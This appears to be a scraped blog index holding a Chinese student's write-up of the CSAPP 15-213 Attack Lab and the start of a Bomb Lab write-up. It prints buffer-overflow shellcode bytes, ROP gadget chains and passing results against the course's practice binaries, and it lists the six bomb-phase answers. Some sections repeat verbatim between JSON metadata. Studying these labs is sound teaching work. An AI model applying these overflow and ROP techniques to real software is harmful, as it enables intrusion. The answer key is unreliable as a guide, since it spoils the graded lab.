攻击代码应该让%rdi的值等于这个字符串的起始地址 hexmatch和strncmp可能会覆盖一部分getbuf中的 buf，注意不要让你的攻击字符串被覆盖掉。 那么初始的准备工作应该是： 确定插入字符串和攻击代码的有效区域，防止被hexmatch和strncmp影响到 查找cookie字符串的编码，加上一个\\0，并插入到攻击代码之前 确定攻击代码的起始位置（在插入的字符串后），将其地址插入到 buffer overflow 的最后 8 个字节 在攻击代码中所做的工作应该是： 让%rdi = 插入字符串的起始位置 将touch3的起始位置插入到返回地址处 调用ret返回 通过多个nop填充字符串（也可以不填充？） 我们首先确定getbuf的buf范围，hexmatch的辐射范围和strncmp的辐射范围。 通过前文我们分析过： 调用getbuf之前: 0x5561dca8 调用getbuf之后: 0x5561dca0 调用rsp = rsp - 40之后: 0x5561dc78 可以了解到buf的范围是：0x5561dc78 ~ 0x5561dc9f，buf后 8 个字节的返回地址的位置是0x5561dca0。 对touch3进行反汇编可得： text Dump of assembler code for function touch3: 0x00000000004018fa \u003c+0\u003e: push %rbx 0x00000000004018fb \u003c+1\u003e: mov %rdi,%rbx 0x00000000004018fe \u003c+4\u003e: movl $0x3,0x202bd4(%rip) # 0x6044dc 0x0000000000401908 \u003c+14\u003e: mov %rdi,%rsi 0x000000000040190b \u003c+17\u003e: mov 0x202bd3(%rip),%edi # 0x6044e4 0x0000000000401911 \u003c+23\u003e: callq 0x40184c 0x0000000000401916 \u003c+28\u003e: test %eax,%eax 0x0000000000401918 \u003c+30\u003e: je 0x40193d 0x000000000040191a \u003c+32\u003e: mov %rbx,%rdx 0x000000000040191d \u003c+3","date":"2024-02-29","objectID":"/attack-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:2:3","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Attack lab 实验总结","uri":"/attack-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#一开始的错误解答"},{"categories":["系统入门"],"content":" 7.3 Phase 3：在 buf 中插入所需字符串和攻击代码，并覆盖返回地址在 phase 3 中，我们需要让程序在getbuf后，运行touch3函数，其注入方式和 phase 2 类似。（此处需要利用vlevel = 3进行跳转后验证，因此和上次一样，我们不能直接跳转到Touch3!语句，还是需要注入代码，将%rdi设置为cookie的值，然后再引导程序跳转到touch3的开头语句）。touch3函数的 C 语言版本如下： c /* Compare string to hex represention of unsigned value */ int hexmatch(unsigned val, char *sval) { char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; sprintf(s, \"%.8x\", val); return strncmp(sval, s, 9) == 0; } void touch3(char *sval) { vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) { printf(\"Touch3!: You called touch3(\"%s\")\\n\", sval); validate(3); } else { printf(\"Misfire: You called touch3(\"%s\")\\n\", sval); fail(3); } exit(0); } 7.3.1 一开始的错误解答这里的差别在于我们输入的string是一个cookie的字符串表示。我们对touch3做反汇编看看cookie的字符串表示存在哪里？ text 0x000000000040190b \u003c+17\u003e: mov 0x202bd3(%rip),%edi # 0x6044e4 我们输入x/s 0x6044e4看看结果： text (gdb) x/s 0x6044e4 0x6044e4 : \"\" 这里同样，可以看出来和上一次的cookie放在一个位置上。但是上次输入的是数字，这次输入的是字符串。因此，上次是将输入的值%rdi设置为0x6044e4位置的值。而这次%rdi指向输入的字符串，我们需要做的是将%rdi设置为0x6044e4。 此外，touch3的入口地址为0x4018fa。因此在最后需要让 return address 等于这个值。 那么总体的注入和上次遵循一样的步骤： 让 return address 等于 buf 的开头(0x5561dc78) 在 buf 开头插入赋值语句，让%edi = 0x6044e4 让 return address = touch3 的入口地址(0x4018fa) 调用ret 综上，这次的调用语句是： text movl $0x6044e4,%edi subq $0x8,%rsp movl $0x4018fa,(%rsp) ret nop nop nop nop 将其保存在ph3.s中，输入gcc -c ph3.s生成ph3.o文件，再objdump -d ph3.o \u003e ph3.d，生成ph3.d文件。 文件内容如下： text ph3.o: file format elf64-x86-64 Disassembly of section .text: 0000000000000000 \u003c.text\u003e: 0: bf e4 44 60 00 mov $0x6044e4,%edi 5: 48 83 ec 08 sub $0x8,%rsp 9: c7 04 24 fa 18 40 00 movl $0x4018fa,(%rsp) 10: c3 retq 11: 90 nop 12: 90 nop 13: 90 nop 14: 90 nop 那么其一直到ret的字节即为bf e4 44 60 00 48 83 ec 08 c7 04 24 fa 18 40 00 c3。一共 17 个字节。将其字节复制到phase3.txt的最前面。添加 23 个nop(0x90)凑齐 40 个字节，最后 8 个字节的值必须等于0x5561dc78。换成小端序就是0x78 0xdc 0x61 0x55。 完整字符串如下： text bf e4 44 60 00 48 83 ec 08 c7 04 24 fa 18 40 00 c3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 dc 61 55 输入./hex2raw \u003c phase3.txt | ./ctarget 。结果如下： bash Cookie: 0x59b997fa Type string:Misfire: You called touch3(\"���Y\") FAIL: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:FAIL:0xffffffff:ctarget:3:BF E4 44 60 00 48 83 EC 08 C7 04 24 FA 18 40 00 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55 最后确实跳转到了touch3，可是 cookie 字符串的值完全不是我们想要的那个东西啊喂！(很不爽) 7.3.2 忽略随机栈空间的不正确解答我们最早是认为，应该让%edi指向0x6044e4，也就是cookie字符串所在的位置，来让%edi和 cookie 相等，但是好像题目不是这么个意思。仔细看了原本的 C 语言函数后发现，cookie不是个字符串，还是个unsigned类型，但是我们之前并没有仔细阅读 C 语言函数。因此闹了笑话。争取的意思应该是让输入的字符串和打印出来的 cookie 的值相同。所以这里不能让%rdi指向 cookie 所在位置，因为其类型都不一样。而应该在代码中插入一段字符串，将其值赋给%rdi，然后让%rdi和cookie的打印版进行比较。 那么cookie的值是多少？我们使用p /x cookie命令打印一下： text (gdb) p /x cookie $4 = 0x59b997fa 所以输入的字符串应该是0x59b997fa。 经过阅读 attacklab.pdf，作者给出了以下几个提示： 攻击字符串中应该包含一个 cookie 的字符串表示。该字符串应该包含 8 个 16 进制字符（不带 0x） 字符串最后应该有个 0，输入man ascii在 Linux 中查找 ascii 表 攻击代码应该让%rdi的值等于这个字符串的起始地址 hexmatch和strncmp可能会覆盖一部分getbuf中的 buf，注意不要让你的攻击字符串被覆盖掉。 那么初始的准备工作应该是： 确定插入字符串和攻击代码的有效区域，防止被hexmatch和strncmp影响到 查找cookie字符串的编码，加上一个\\0，并插入到攻击代码之前 确定攻击代码的起始位置（在插入的字符串后），将其地址插入到 buffer overflow 的最后 8 个字节 在攻击代码中所做的工作应该是： 让%rdi = 插入字符串的起始位置 将touch3的起始位置插入到返回地址处 调用ret返回 通过多个nop填充字符串（也可以不填充？） 我们首先确定getbuf的buf范围，hexmatch的辐射范围和strncmp的辐射范围。 通过前文我们分析过： 调用getbuf之前: 0x5561dca8 调用getbuf之后: 0x5561dca0 调用rsp = rsp - 40之后: 0x5561dc78 可以了解到buf的范围是：0x5561dc78 ~ 0x5561dc9f，buf后 8 个字节的返回地址的位置是0x5561dca0。 对touch3进行反汇编可得： text Dump of assembler code for function touch3: 0x00000000004018fa \u003c+0\u003e: push %rbx 0x00000000004018fb \u003c+1\u003e: mov %rdi,%rbx 0x00000000004018fe \u003c+4\u003e: movl $0x3,0x202bd4(%rip) # 0x6044dc 0x0000000000401908 \u003c+14\u003e: mov %rdi,%rsi 0x000000000040190b \u003c+17\u003e: mov 0x202bd3(%rip),%edi # 0x6044e4 0x0000000000401911 \u003c+23\u003e: callq 0x40184c 0x0000000000401916 \u003c+28\u003e: test %eax,%eax 0x0000000000401918 \u003c+30\u003e: je 0x40193d 0x000000000040191a \u003c+32\u003e: mov %rbx,%rdx 0x000000000040191d \u003c+3","date":"2024-02-29","objectID":"/attack-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:2:3","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Attack lab 实验总结","uri":"/attack-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#忽略随机栈空间的不正确解答"},{"categories":["系统入门"],"content":" 7.3 Phase 3：在 buf 中插入所需字符串和攻击代码，并覆盖返回地址在 phase 3 中，我们需要让程序在getbuf后，运行touch3函数，其注入方式和 phase 2 类似。（此处需要利用vlevel = 3进行跳转后验证，因此和上次一样，我们不能直接跳转到Touch3!语句，还是需要注入代码，将%rdi设置为cookie的值，然后再引导程序跳转到touch3的开头语句）。touch3函数的 C 语言版本如下： c /* Compare string to hex represention of unsigned value */ int hexmatch(unsigned val, char *sval) { char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; sprintf(s, \"%.8x\", val); return strncmp(sval, s, 9) == 0; } void touch3(char *sval) { vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) { printf(\"Touch3!: You called touch3(\"%s\")\\n\", sval); validate(3); } else { printf(\"Misfire: You called touch3(\"%s\")\\n\", sval); fail(3); } exit(0); } 7.3.1 一开始的错误解答这里的差别在于我们输入的string是一个cookie的字符串表示。我们对touch3做反汇编看看cookie的字符串表示存在哪里？ text 0x000000000040190b \u003c+17\u003e: mov 0x202bd3(%rip),%edi # 0x6044e4 我们输入x/s 0x6044e4看看结果： text (gdb) x/s 0x6044e4 0x6044e4 : \"\" 这里同样，可以看出来和上一次的cookie放在一个位置上。但是上次输入的是数字，这次输入的是字符串。因此，上次是将输入的值%rdi设置为0x6044e4位置的值。而这次%rdi指向输入的字符串，我们需要做的是将%rdi设置为0x6044e4。 此外，touch3的入口地址为0x4018fa。因此在最后需要让 return address 等于这个值。 那么总体的注入和上次遵循一样的步骤： 让 return address 等于 buf 的开头(0x5561dc78) 在 buf 开头插入赋值语句，让%edi = 0x6044e4 让 return address = touch3 的入口地址(0x4018fa) 调用ret 综上，这次的调用语句是： text movl $0x6044e4,%edi subq $0x8,%rsp movl $0x4018fa,(%rsp) ret nop nop nop nop 将其保存在ph3.s中，输入gcc -c ph3.s生成ph3.o文件，再objdump -d ph3.o \u003e ph3.d，生成ph3.d文件。 文件内容如下： text ph3.o: file format elf64-x86-64 Disassembly of section .text: 0000000000000000 \u003c.text\u003e: 0: bf e4 44 60 00 mov $0x6044e4,%edi 5: 48 83 ec 08 sub $0x8,%rsp 9: c7 04 24 fa 18 40 00 movl $0x4018fa,(%rsp) 10: c3 retq 11: 90 nop 12: 90 nop 13: 90 nop 14: 90 nop 那么其一直到ret的字节即为bf e4 44 60 00 48 83 ec 08 c7 04 24 fa 18 40 00 c3。一共 17 个字节。将其字节复制到phase3.txt的最前面。添加 23 个nop(0x90)凑齐 40 个字节，最后 8 个字节的值必须等于0x5561dc78。换成小端序就是0x78 0xdc 0x61 0x55。 完整字符串如下： text bf e4 44 60 00 48 83 ec 08 c7 04 24 fa 18 40 00 c3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 dc 61 55 输入./hex2raw \u003c phase3.txt | ./ctarget 。结果如下： bash Cookie: 0x59b997fa Type string:Misfire: You called touch3(\"���Y\") FAIL: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:FAIL:0xffffffff:ctarget:3:BF E4 44 60 00 48 83 EC 08 C7 04 24 FA 18 40 00 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55 最后确实跳转到了touch3，可是 cookie 字符串的值完全不是我们想要的那个东西啊喂！(很不爽) 7.3.2 忽略随机栈空间的不正确解答我们最早是认为，应该让%edi指向0x6044e4，也就是cookie字符串所在的位置，来让%edi和 cookie 相等，但是好像题目不是这么个意思。仔细看了原本的 C 语言函数后发现，cookie不是个字符串，还是个unsigned类型，但是我们之前并没有仔细阅读 C 语言函数。因此闹了笑话。争取的意思应该是让输入的字符串和打印出来的 cookie 的值相同。所以这里不能让%rdi指向 cookie 所在位置，因为其类型都不一样。而应该在代码中插入一段字符串，将其值赋给%rdi，然后让%rdi和cookie的打印版进行比较。 那么cookie的值是多少？我们使用p /x cookie命令打印一下： text (gdb) p /x cookie $4 = 0x59b997fa 所以输入的字符串应该是0x59b997fa。 经过阅读 attacklab.pdf，作者给出了以下几个提示： 攻击字符串中应该包含一个 cookie 的字符串表示。该字符串应该包含 8 个 16 进制字符（不带 0x） 字符串最后应该有个 0，输入man ascii在 Linux 中查找 ascii 表 攻击代码应该让%rdi的值等于这个字符串的起始地址 hexmatch和strncmp可能会覆盖一部分getbuf中的 buf，注意不要让你的攻击字符串被覆盖掉。 那么初始的准备工作应该是： 确定插入字符串和攻击代码的有效区域，防止被hexmatch和strncmp影响到 查找cookie字符串的编码，加上一个\\0，并插入到攻击代码之前 确定攻击代码的起始位置（在插入的字符串后），将其地址插入到 buffer overflow 的最后 8 个字节 在攻击代码中所做的工作应该是： 让%rdi = 插入字符串的起始位置 将touch3的起始位置插入到返回地址处 调用ret返回 通过多个nop填充字符串（也可以不填充？） 我们首先确定getbuf的buf范围，hexmatch的辐射范围和strncmp的辐射范围。 通过前文我们分析过： 调用getbuf之前: 0x5561dca8 调用getbuf之后: 0x5561dca0 调用rsp = rsp - 40之后: 0x5561dc78 可以了解到buf的范围是：0x5561dc78 ~ 0x5561dc9f，buf后 8 个字节的返回地址的位置是0x5561dca0。 对touch3进行反汇编可得： text Dump of assembler code for function touch3: 0x00000000004018fa \u003c+0\u003e: push %rbx 0x00000000004018fb \u003c+1\u003e: mov %rdi,%rbx 0x00000000004018fe \u003c+4\u003e: movl $0x3,0x202bd4(%rip) # 0x6044dc 0x0000000000401908 \u003c+14\u003e: mov %rdi,%rsi 0x000000000040190b \u003c+17\u003e: mov 0x202bd3(%rip),%edi # 0x6044e4 0x0000000000401911 \u003c+23\u003e: callq 0x40184c 0x0000000000401916 \u003c+28\u003e: test %eax,%eax 0x0000000000401918 \u003c+30\u003e: je 0x40193d 0x000000000040191a \u003c+32\u003e: mov %rbx,%rdx 0x000000000040191d \u003c+3","date":"2024-02-29","objectID":"/attack-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:2:3","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Attack lab 实验总结","uri":"/attack-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#正确的解答"},{"categories":["系统入门"],"content":" 8 Part II: Return oriented Programming attackrtarget的攻击要比ctarget难一些，因为： 开启了栈随机化，程序的地址难以预测 开启了 Non-executable 位，导致我们插入的代码部分难以执行 因此，我们使用一种新的方法：return oriented programming attacks。它的核心在于利用已有的程序，而不是注入代码。每个 gadget 是一个代码段，每个 gadget 的最后都是ret指令（编码c3），将这个自己和其前面的部分字节组合起来，可以合成我们想要的指令。此外，针对 x86_64，我们不一定要利用整条指令，有的时候一条指令的一部分字节又可以组成另一条指令。所有 gadget 的地址被压在栈上，每次调用ret之后就会返回到下一个 gadget 的地址。 ","date":"2024-02-29","objectID":"/attack-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:3:0","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Attack lab 实验总结","uri":"/attack-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#part-ii-return-oriented-programming-attack"},{"categories":["系统入门"],"content":" 8.1 Phase 4利用rop重做 Phase 2 的实验，可以使用movq, popq, ret, nop指令以及前 8 个寄存器(%rax–%rdi) 提示： 可以在start_farm和mid_farm之间寻找 gadget 可以只使用 2 个 gadget 当一个 gadget 使用popq指令时，它从栈上弹出一个数值，所以你的攻击字符串可以是 gadget 地址和数值的组合。 Phase 2 的目的是让test()跳转到touch2函数，并且需要让%edi的值等于cookie的值。 我们当时做题的主要过程是： 让最后的转移地址为buf开头的位置(0x5561dc78) 在buf中存储攻击指令 让%edi = *0x6054e4 将touch2的地址压入栈中，pushq 0x4017ec 调用ret返回 我们在 phase 2 中需要插入的代码是： text movq $0x6054e4,%rax movq (%rax),%rdi subq $0x8,%rsp movq $0x4017ec,(%rsp) ret 这里的变化在于，我们不需要使用buf来存储攻击指令了，而是在整个程序中寻找攻击指令。把第一个 gadget 的地址放在返回地址处，把第二个 gadget 的地址放在第一个 gadget 后面。以此类推。我们的目的是找到所有的 gadget。 但是其实这段代码可以通过把0x6054e4和0x6017ec两个值压在栈上。首先利用一个popq指令将其弹出到%rax中，然后将%rax处的值移动到%rdi上。我们可以这样设计栈帧： 第一个gadget中的代码是： text movq %rsp, %rxx popq %rax movq (%rax),%rdi 第二个gadget中的代码是： text popq %rax movq %rax,(%rxx) 使用popq %rax是因为，popq有 8 种可能的结果，而只有popq %rax出现在代码的字节中，因此我们从这里出发。我们翻译一下movq (%rax),%rdi，其字节编码为48 8b 38。 但是我们发现其实不用那么麻烦，也就是说不用保存之前的%rsp，这是因为我们可以通过gadget中的ret指令弹出后 8 个字节的地址并且首先跳转，那么就无需把touch3的地址保存在最开始的部分。栈空间可以简化成如下情况： 但是我们发现一个问题，就是movq (%rax),%rdi这条指令所对应的字节在源程序中找不到，因此我们需要采取一个更加优化的办法，就是不在栈上保存cookie的地址，而是直接保存cookie的值，cookie的值为0x59b997fa，那么栈空间可以简化成如下情况： 这样只需要两条指令就可以做到了。这两条指令的编码是 text gadget.o: file format elf64-x86-64 Disassembly of section .text: 0000000000000000 \u003c.text\u003e: 0: 58 pop %rax 1: 48 89 c7 mov %rax,%rdi 但是这两条指令我们无法在同一处找到，因此需要划分为 2 个gadget。且两条后面的都必须接数个90（nop）加上一个c3。 第一个的地址是4019ab或4019cc。第二个的地址是4019a2或者4019c5。 我们这里使用4019ab和4019a2两个gadget。第一个中存储pop %rax指令，第二个中存储mov %rax, %rdi指令。最后的栈空间如下： 由此，输入的攻击字符串的前 40 个字节随意，后面 32 个字节根据上述栈情况为（注意应该用小端法） text ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 a2 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00 刚刚差点把 gadget1 和 2 的地址搞反了，导致跑出来 segmentation fault，还疑惑是怎么回事，后来一看发现不好，哈哈哈哈，做题的时候还是要认真仔细嗷！ 输入./hex2raw \u003c phase4.txt | ./rtarget -q（注意不要输入成ctarget啦！），运行结果如下： bash gwen@gwen-virtual-machine:~/Documents/report/code/15213/lab/lab3-attack-lab$ ./hex2raw \u003c phase4.txt | ./rtarget -q Cookie: 0x59b997fa Type string:Touch2!: You called touch2(0x59b997fa) Valid solution for level 2 with target rtarget PASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 ","date":"2024-02-29","objectID":"/attack-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:3:1","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Attack lab 实验总结","uri":"/attack-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#phase-4"},{"categories":["系统入门"],"content":" 8.2 Phase 5phase 5 的任务是让%rdi指向cookie的字符串表示并调用touch 3，这个任务看起来有点类似我们在 Phase 3 中做的工作。 作者提示： 可使用的gadget的范围是start_farm到end_farm 利用 Appendix 中的表 复习一下课本 P83 的movl的用法 官方答案使用了 8 个 gadget 在 Phase 3 中我们所做的工作是： 插入攻击字符串在攻击代码前 在返回地址处插入攻击代码的起始位置 在攻击代码中实现如下操作： 将攻击字符串的地址赋值给%rdi 将touch3的返回地址压入返回地址处 现在使用rop后的问题在于：攻击字符串压到哪？现在栈上是返回地址和字符串的组合。那么我们的想法是让攻击字符串放在所有 gadget 地址之后。但是具体放在之后多少呢？这要看mov xxx, %rdi中哪些地址的编码存在。 首先，cookie的值是59b997fa，那么其字符串编码是0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61 0x00(0x00是字符串最后的\\0)。那么我们构建的gadget中应有的步骤是： mov 地址,%rdi ret 此外，touch3的地址是0x4018fa。那么我们最初设计的栈空间如图： 但是我后来有点卡壳了，问题在于把字符串存在什么位置呢？如果存在那个位置，在rtarget汇编中能找到对应的gadget吗？于是我查找了一点资料(有点耍赖了对不起对不起~)，这个资料中提到的一条信息是我没有想到的： rtarget 相比 ctarget 的区别在于开启了栈随机化。也就是运行时字符串的地址是不确定的。在 phase 3 中我们所做的工作是刚好将其压在test函数的返回地址下面，但是这里我们需要其相对与栈顶的地址。 因此，我们应该做的步骤是： text 1. 将攻击字符串放在%rsp + offset 处 2. 让 %rdi = %rsp + offset 3. ret 那么如何计算这个地址，并且将其赋给%rdi呢？这个地址的计算需要在%rsp的基础上偏移几十个字节。地址的计算我们可以使用lea指令，然而加法运算如何实现呢？我们看看代码中有没有提供： c /* Add two arguments */ long add_xy(long x, long y) { return x+y; } 这段代码的汇编格式如下： text 00000000004019d6 \u003cadd_xy\u003e: 4019d6: 48 8d 04 37 lea (%rdi,%rsi,1),%rax 4019da: c3 retq 其把%rdi和%rsi累加到%rax中，那么我们要计算偏移量，需要分别把%rsp和偏移量放到%rsi和%rdi中。最后让%rdi = rax。 在rtarget中，与%rsp相关的字节有48 89 e0，其编码为movq %rsp,%rax。和%esp相关的字节有89 e0，其编码为movl %esp, %eax。包含这段编码的代码如下： text 0000000000401a03 \u003caddval_190\u003e: 401a03: 8d 87 41 48 89 e0 lea -0x1f76b7bf(%rdi),%eax 401a09: c3 retq 0000000000401a18 \u003cgetval_345\u003e: // 不可取，c1不是单独指令 401a18: b8 48 89 e0 c1 mov $0xc1e08948,%eax 401a1d: c3 retq 0000000000401a39 \u003caddval_110\u003e: 401a39: 8d 87 c8 89 e0 c3 lea -0x3c1f7638(%rdi),%eax 401a3f: c3 retq 0000000000401a47 \u003caddval_201\u003e: // 不可取，c7不是单独指令 401a47: 8d 87 48 89 e0 c7 lea -0x381f76b8(%rdi),%eax 401a4d: c3 retq 0000000000401a5a \u003csetval_299\u003e: // 不可取，91不是单独指令 401a5a: c7 07 48 89 e0 91 movl $0x91e08948,(%rdi) 401a60: c3 retq 0000000000401a83 \u003caddval_358\u003e: 401a83: 8d 87 08 89 e0 90 lea -0x6f1f76f8(%rdi),%eax 401a89: c3 retq 0000000000401a97 \u003csetval_181\u003e: // 不可取，c2不是单独指令 401a97: c7 07 48 89 e0 c2 movl $0xc2e08948,(%rdi) 401a9d: c3 retq 0000000000401aab \u003csetval_350\u003e: 401aab: c7 07 48 89 e0 90 movl $0x90e08948,(%rdi) 401ab1: c3 retq 那么之前的过程就变为： text 1. rax = rsp(48 89 e0) 2. rsi = 偏移量 3. rdi = rax(\u003csetval_210\u003e 中的 48 89 c7) 4. rax = rdi + rsi（lea指令） 5. rdi = rax(\u003csetval_210\u003e 中的 48 89 c7) 6. ret 7. 将攻击字符串放在%rsp + offset 处 我们找一下以%rsi和%rdi为目的寄存器的指令。 以%rdi为目的寄存器的指令编码有(48)* 89 (c|d|e|f)(7|f)，在rtarget中可能的代码段如下： text 00000000004019a0 \u003caddval_273\u003e: // 不可取，c3不是指令 4019a0: 8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax 4019a6: c3 retq 00000000004019ae \u003csetval_237\u003e: // 不可取，c7不是指令 4019ae: c7 07 48 89 c7 c7 movl $0xc7c78948,(%rdi) 4019b4: c3 retq 00000000004019c3 \u003csetval_426\u003e: // 是他！是他！就是他！ 4019c3: c7 07 48 89 c7 90 movl $0x90c78948,(%rdi) 4019c9: c3 retq 以%rsi/%esi为目的寄存器的指令编码有(48)* 89 (c|d|e|f)(6|e)。在rtarget中可能的代码段如下： text 00000000004019e8 \u003caddval_113\u003e: // 不可取，78 c9不是指令 4019e8: 8d 87 89 ce 78 c9 lea -0x36873177(%rdi),%eax 4019ee: c3 retq 0000000000401a11 \u003caddval_436\u003e: // 可以是他！ 401a11: 8d 87 89 ce 90 90 lea -0x6f6f3177(%rdi),%eax 401a17: c3 retq 0000000000401a25 \u003caddval_187\u003e: // 可以是他，38 c0 是cmpb %al指令，不影响结果 401a25: 8d 87 89 ce 38 c0 lea -0x3fc73177(%rdi),%eax 401a2b: c3 retq 0000000000401a61 \u003caddval_404\u003e: // 不可取，92 c3不是指令 401a61: 8d 87 89 ce 92 c3 lea -0x3c6d3177(%rdi),%eax 401a67: c3 retq 这里没有48，那么就只能输送到%esi中。这里的难点在于如何把偏移量输送到%esi中？这里肯定是不能直接输送了，必须通过寄存器的中转。这里只出现了89 ce，通过查表我们可以发现89 ce对应的指令是movl %ecx, %esi。那么我们还需要想办法把值送到%ecx中。那么前面的过程就变成了： text 1. rax = rsp(48 89 e0) 2. ecx = 偏移量； rsi = ecx(89 ce) 3. rdi = rax(\u003csetval_210\u003e 中的 48 89 c7) 4. rax = rdi + rsi（lea指令） 5. rdi = rax(\u003csetval_210\u003e 中的 48 89 c7) 6. ret 7. 将攻击字符串放在%rsp + offset 处 我们再来探测一下目的寄存器为%ecx的相关指令，其格式为(48)* 89 (c|d|e|f)(1|9)，包含其格式的代码段为： text 00000000004019f6 \u003cgetval_226\u003e: // 不可取，48 c0不是指令 4019f6: b8 89 d1 48 c0 mov $0xc048d189,%eax 4019fb: c3 retq 0000000000401a33 \u003cgetval_159\u003e: // 可取，38 c9 是cmpb %cl指令 401a33: b8 89 d1 38 c9 mov $0xc938d189,%eax 401a38: c3 retq 0000000000401a68 \u003cgetval_311\u003e: // 可取，08 db 是orb %bl指令 401","date":"2024-02-29","objectID":"/attack-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:3:2","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Attack lab 实验总结","uri":"/attack-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#phase-5"},{"categories":["系统入门"],"content":" 9 总结 phase 1 很简单，让 buffer overflow 溢出，然后覆盖返回地址即可 phase 2 需要让%rdi的值等于cookie的值，我们需要插入一部分自己的攻击代码，比 Phase 1 难度稍微高点 phase 3 中我们需要插入自己的攻击字符串，然后让ret指令返回到攻击代码开始处，通过指令将%rdi的值设置为攻击字符串的地址，并且把touch3的地址压到栈上。这里的难点在于hexmatch和strncmp中出现了push的压栈操作，并且使用了一段随机的 buffer，如果把攻击字符串放在攻击代码之前，会导致攻击字符串被破坏。因此这里的核心是把攻击字符串放在 caller 函数(test)的栈空间内（在返回地址下面），然后让%rdi指向这里 phase 4 \u0026 phase 5 的难点在于将过程理清楚，并且在rtarget中找到对应的gadget，将栈上作为gadget地址和数值的组合，巧妙地运用popq和ret和其他指令组合出我们想要的操作。 phase 5 的核心在于首先确定rax = rdi + rsi，并且这两个寄存器一个存储%rsp，一个存储偏移量。要将数据输入到这两个寄存器，随后不断的通过反推，找到以他们为目标地址的指令通用结构，在rtarget中查找到相关指令，然后确定其源寄存器。再来反推什么指令能将数据输送到源寄存器。打通一条通路，然后确定每个 gadget 的地址，最后串联起来就是我们想要的 gadget 列表！这个过程收获很大！ 虽然做这 5 个 Phase 的过程不容易，但是总体来说受益匪浅！ ","date":"2024-02-29","objectID":"/attack-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:4:0","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Attack lab 实验总结","uri":"/attack-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#总结"},{"categories":["系统入门"],"content":" 10 参考资料 CSAPP 实验之 attack lab CSAPP | Lab3-Attack Lab 深入解析 csapp-attacklab 详解 ","date":"2024-02-29","objectID":"/attack-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:5:0","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Attack lab 实验总结","uri":"/attack-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#参考资料"},{"categories":["系统入门"],"content":" 12 前言我看见网上非常多的教程里面是一边使用gdb调试（过程中可能引爆炸弹），一边探索结果的。他们可能多次启动了GDB来完成实验。但是我在bomb.c中看到了如下指示: text No VICTIM may debug, reverse-engineer, run \"strings\" on, decompile, decrypt, or use any other technique to gain knowledge of and defuse the BOMB. 并且在 CSAPP 3e 的 handout 中也写的很清楚，不应该多次启动 gdb 来通过输入随机序列的方式来探测密码，毕竟解引的机会只有一次。如果引爆炸弹，autolab 的分数会掉。所以正确的方法应该是对汇编程序进行逆向分析，然后推算炸弹的密码，而不是通过多次输入字符串来利用炸弹进行测试。 不要一开始就开gdb运行phase，可以先启动gdb，在main函数部分打断点，因为很多地方需要从gdb中获取信息，但是我们又不能直接开始做题，因为一做题就无法二次启动gdb了（会扣实验分）。最好是把每个phase都分析透彻，得出确定的答案了，再在gdb中运行，因为中间没有空闲给你打断点和运行，直接进入gets输入了。 6 道题的答案为（如果用文件输入的话，记得最后有个换行符，否则炸弹爆炸）： text Border relations with Canada have never been better. 1 2 4 8 16 32 0 207 0 0 DrEvil IONEFG 4 3 2 1 6 5 20 ","date":"2024-02-26","objectID":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:1:0","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Bomb lab 实验总结","uri":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#前言"},{"categories":["系统入门"],"content":" 13 题目浏览首先我们使用wget命令从实验官网下载tar文件，使用tar xvf bomb.tar解压文件。 打开文件夹，里面有 2 个重要文件，分别是bomb.c和bomb二进制文件。我们使用objdump -d bomb \u003e 